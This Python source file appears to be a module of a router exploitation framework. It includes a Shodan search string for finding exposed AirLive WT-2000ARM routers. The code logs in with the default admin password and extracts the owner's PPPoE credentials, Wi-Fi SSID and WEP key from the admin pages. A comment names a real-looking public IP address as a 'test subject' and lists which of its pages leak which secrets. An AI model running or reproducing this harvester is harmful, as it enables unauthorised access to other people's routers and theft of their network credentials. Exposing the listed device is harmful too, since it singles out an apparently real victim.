#Name:Airlive WT-2000ARM information harvester module
#File:WT2000ARM.py
#Author:Ján Trenčanský
#License: ADD LATER
#Created: 29.8.2013
#Last modified: 1.9.2013
#Shodan Dork: WWW-Authenticate: Basic realm="AirLive WT-2000ARM
#Description:

#FOR YOUR EYES ONLY! DELETE LATER!!!
#Test subject:
#http://88.102.197.207/basic/home_wan.htm -PPPOE credentials
#http://88.102.197.207/basic/home_wlan.htm -WLAN Key and SSID, MAC filter
#http://88.102.197.207/status/status_deviceinfo.htm -MAC Address location usefull for WPS
#http://88.102.197.207/advanced/adv_firewall.htm -Might be usefull

#UI
#WEP/WPA
#DATABASE

import httplib2
import re
import core.Harvester


class Harvester(core.Harvester.RextHarvester):
    #Default credentials and default IP of target ( ,() is there because of for cycle that goes through credentials)
    def __init__(self):  # need to fix passing credentials () breaks for cycle)
        self.target = "192.168.1.1"
        self.credentials_list = (("admin", "airlive"), ())
        core.Harvester.RextHarvester.__init__(self)

    #Start method needs to be named do_* for nested interpreter
    def do_run(self, e):
        http = httplib2.Http(".cache")
        for credentials in self.credentials_list:
            username = credentials[0]
            password = credentials[1]
            http.add_credentials(username, password)
            #Sending request
            try:
                print("Connecting to " + self.target)
                headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
            except:
                print("Connection error:Probably server timeout")
                return -1
            #Checks if authentication was successful
            if headers.status == 200:
                print("200:Authentication successful :)")
                ppp_credentials = self.fetch_ppp(body)
                print(ppp_credentials)
                #Sending request for home_wlan
                headers, body = http.request("http://"+self.target+"/basic/home_wlan.htm")
                if headers.status == 200:
                    wlan_credentials = self.fetch_wlan(body)
                    print(wlan_credentials)
                    return 1
                else:
                    print("Connection lost: Failed fetching home_wlan.html. Status code:"+headers.status)
                    return -1
            elif headers.status == 401:
                print("401:Authentication failed")
                continue
            elif headers.status == 404:
                print("404:Page does not exists")
                break
            else:
                print("Something went wrong here. Status code:"+headers.status)
                break
        return 1  # this shouldn't happen
            
    def fetch_ppp(self, body):
        html = body.decode('ascii')
        #Regex for username
        username_re = re.compile(r"""   #raw string
            NAME="wan_PPPUsername"      #search for wan_PPPUsername
            [^>]*?                      #Ignore any args between NAME and VALUE
            VALUE=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<username>[^\1]+?)       #Get ppp_username
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
        #Regex for password
        password_re = re.compile(r"""   #raw string
            NAME="wan_PPPPassword"      #search for wan_PPPPassword
            [^>]*?                      #Ignore any args between NAME and VALUE
            VALUE=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<password>[^\1]+?)       #Get ppp_password
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
        ppp_username = username_re.search(html)
        ppp_username = ppp_username.group("username")
        ppp_password = password_re.search(html)
        ppp_password = ppp_password.group("password")
        ppp_credentials = (ppp_username,ppp_password)
        return ppp_credentials

    def fetch_wlan(self,body):
        html = body.decode('ascii')
        essid_re = re.compile(r"""   #raw string
            name="ESSID"                #search for essid
            [^>]*?                      #Ignore any args between NAME and VALUE
            value=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<essid>[^\1]+?)          #Get essid
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
        #TODO return more than one key, skip keys 0x0000000000
        #TODO add support for determination of encryption type
        #WPA passphrase 
        wep_key_re = re.compile(r"""   #raw string
            name="WEP_Key[1-9]          #search for wan_PPPPassword
            [^>]*?                      #Ignore any args between NAME and VALUE
            value=                      #VALUE parameter
            (?P<quote>["'])             #Simple or double quotes
            (?P<key>[^\1]+?)            #Get key
            (?P=quote)                  #closed by quotes
            [^>]*?                      #any other args after NAME
            >                           #close of INPUT tag
            """, re.ASCII | re.IGNORECASE | re.VERBOSE)
        essid = essid_re.search(html)
        essid = essid.group("essid")
        wep_key = wep_key_re.search(html)
        wep_key = wep_key.group("key")
        wlan_credentials = (essid,wep_key)
        return wlan_credentials
                

#if __name__ == "__main__":
Harvester()
